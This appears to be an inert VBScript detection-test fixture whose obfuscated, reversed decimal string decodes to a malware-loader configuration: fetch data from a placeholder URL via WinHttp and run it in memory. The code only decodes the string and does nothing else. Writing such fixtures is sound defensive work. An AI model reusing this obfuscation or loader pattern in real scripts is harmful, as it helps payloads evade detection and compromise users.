Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_a729b7c3 = "99-48-102-54-54-53-55-49-52-50-47-98-97-76-115-115-101-114-116-110-117-72-61-116-110-101-103-97-95-114-101-115-117-124-116-97-100-46-99-54-53-49-101-52-55-56-47-100-105-108-97-118-110-105-46-101-108-112-109-97-120-101-46-99-48-102-54-54-53-55-49-52-50-47-47-58-115-112-116-116-104-61-108-114-117-124-99-48-102-54-54-53-55-49-52-50-45-110-103-105-97-112-109-97-99-61-100-105-95-110-103-105-97-112-109-97-99-124-50-61-116-110-117-111-99-95-101-103-97-116-115-124-49-46-53-46-116-115-101-117-113-101-82-112-116-116-72-110-105-87-46-112-116-116-72-110-105-87-61-114-101-116-112-97-100-97-124-121-114-111-109-101-109-95-104-99-116-97-112-115-105-100-44-101-116-111-109-101-114-95-101-114-105-117-113-99-97-61-115-112-101-116-115-124-49-61-118"
Const Codec_a729b7c3 = "decimal_dash|reverse_bytes|"

Function Load_a729b7c3()
  Dim parts, result(), item5
  parts = Split(Material_a729b7c3, "-")
  ReDim result(UBound(parts))
  For item5 = 0 To UBound(parts)
    result(item5) = CInt(parts(item5))
  Next
  Load_a729b7c3 = result
End Function

Function Decode_a729b7c3(ByRef item1)
  Dim result(), item5, keyBytes, previous
  ReDim result(UBound(item1))
  For item5 = 0 To UBound(item1)
    result(UBound(item1) - item5) = item1(item5)
  Next
  Decode_a729b7c3 = result
End Function

Function Recover_a729b7c3()
  Dim item1, item2, item3, item4, item5, item6, item7, item8
  ' configuration reconstruction
If (2 > 1) Then item4 = "left" Else item4 = "right"
  item1 = Load_a729b7c3()
  For item6 = 0 To 0
    item2 = Decode_a729b7c3(item1)
  Next
  item3 = ""
  For item5 = 0 To UBound(item2)
    item3 = item3 & Chr(item2(item5))
  Next
' reconstruction complete
  Recover_a729b7c3 = item3
End Function

Sub Copy_a729b7c3(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_a729b7c3()
  Dim resultText
  Call Copy_a729b7c3(Recover_a729b7c3(), resultText)
  Inspect_a729b7c3 = resultText
End Function
